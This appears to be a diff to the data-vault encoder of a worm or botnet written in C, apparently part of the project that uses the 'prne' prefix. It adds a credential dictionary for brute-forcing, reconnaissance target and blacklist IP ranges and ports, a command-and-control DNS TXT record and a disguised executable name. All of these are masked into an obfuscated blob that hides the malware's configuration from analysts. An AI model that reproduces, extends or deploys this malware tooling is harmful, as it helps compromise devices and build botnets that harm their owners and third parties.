@@ -11,6 +11,7 @@
 #include <assert.h>
 
 #include <unistd.h>
+#include <fcntl.h>
 
 #include <mbedtls/entropy.h>
 #include <mbedtls/ctr_drbg.h>
@@ -23,16 +24,17 @@
 */
 
 static struct {
-	const void *data;
+	void *data;
 	size_t size;
 	prne_dvault_mask_result_t encoded;
 	uint16_t pos;
 	prne_data_type_t type;
 	bool set;
+	bool ownership;
 } ENTRIES[NB_PRNE_DATA_KEY];
 
 #define add_cstr(key, cstr) {\
-	static const char STR[] = cstr;\
+	static char STR[] = cstr;\
 	ENTRIES[key].data = STR;\
 	ENTRIES[key].size = sizeof(STR);\
 	ENTRIES[key].type = PRNE_DATA_TYPE_CSTR;\
@@ -40,11 +42,34 @@ static struct {
 }
 
 #define add_bin(key, bin_arr) {\
-	static const uint8_t ARR[] = bin_arr;\
+	static uint8_t ARR[] = bin_arr;\
 	ENTRIES[key].data = ARR;\
 	ENTRIES[key].size = sizeof(ARR);\
 	ENTRIES[key].type = PRNE_DATA_TYPE_BIN;\
 	ENTRIES[key].set = true;\
+}
+
+static void add_file (const prne_data_key_t key, const char *path) {
+	const int fd = open(path, O_RDONLY);
+	const off_t size = lseek(fd, 0, SEEK_END);
+	ssize_t f_ret;
+
+	prne_assert(fd >= 0 && size >= 0);
+	prne_assert(lseek(fd, 0, SEEK_SET) == 0);
+	ENTRIES[key].data = prne_malloc(1, size);
+	ENTRIES[key].size = size;
+	ENTRIES[key].type = PRNE_DATA_TYPE_BIN;
+	ENTRIES[key].set = true;
+	ENTRIES[key].ownership = true;
+
+	if (ENTRIES[key].size > 0) {
+		prne_assert(ENTRIES[key].data != NULL);
+	}
+
+	f_ret = read(fd, ENTRIES[key].data, ENTRIES[key].size);
+	prne_assert(f_ret >= 0 && (size_t)f_ret == ENTRIES[key].size);
+
+	close(fd);
 }
 
 static mbedtls_entropy_context ent;
@@ -114,7 +139,7 @@ static void gen_mask (uint8_t *out) {
 	prne_free_imap(&q);
 }
 
-int main (void) {
+int main (const int argc, const char **args) {
 	int callret;
 	uint8_t mask[256];
 	uint_fast16_t pos = 0;
@@ -123,6 +148,10 @@ int main (void) {
 
 	if (isatty(STDOUT_FILENO)) {
 		fprintf(stderr, "Refusing to print on terminal.\n");
+		return 2;
+	}
+	if (argc < 2) {
+		fprintf(stderr, "Usage: %s <cred dict>\n", args[0]);
 		return 2;
 	}
 
@@ -150,7 +179,13 @@ int main (void) {
 	add_bin(PRNE_DATA_KEY_RESOLV_NS_IPV4, PRNE_RESOLV_NS_POOL_IPV4);
 	add_bin(PRNE_DATA_KEY_RESOLV_NS_IPV6, PRNE_RESOLV_NS_POOL_IPV6);
 	add_cstr(PRNE_DATA_KEY_CNC_TXT_REC, PRNE_CNC_TXT_REC);
-	add_cstr(PRNE_DATA_KEY_EXEC_NAME, "./httpd");
+	add_bin(PRNE_DATA_KEY_RCN_PORTS, PRNE_RCN_PORTS);
+	add_bin(PRNE_DATA_KEY_RCN_T_IPV4, PRNE_RCN_T_IPV4);
+	add_bin(PRNE_DATA_KEY_RCN_BL_IPV4, PRNE_RCN_BL_IPV4);
+	add_bin(PRNE_DATA_KEY_RCN_T_IPV6, PRNE_RCN_T_IPV6);
+	add_bin(PRNE_DATA_KEY_RCN_BL_IPV6, PRNE_RCN_BL_IPV6);
+	add_file(PRNE_DATA_KEY_CRED_DICT, args[1]);
+	add_cstr(PRNE_DATA_KEY_EXEC_NAME, PRNE_BNE_EXEC_NAME);
 
 	pos += NB_PRNE_DATA_KEY * sizeof(uint16_t);
 
@@ -240,6 +275,12 @@ int main (void) {
 	assert_errno(
 		write(STDOUT_FILENO, m_out, pos) == (ssize_t)pos,
 		"dumping on stdout");
+
+	for (prne_data_key_t i = 0; i < NB_PRNE_DATA_KEY; i += 1) {
+		if (ENTRIES[i].ownership) {
+			prne_free(ENTRIES[i].data);
+		}
+	}
 
 	return 0;
 }
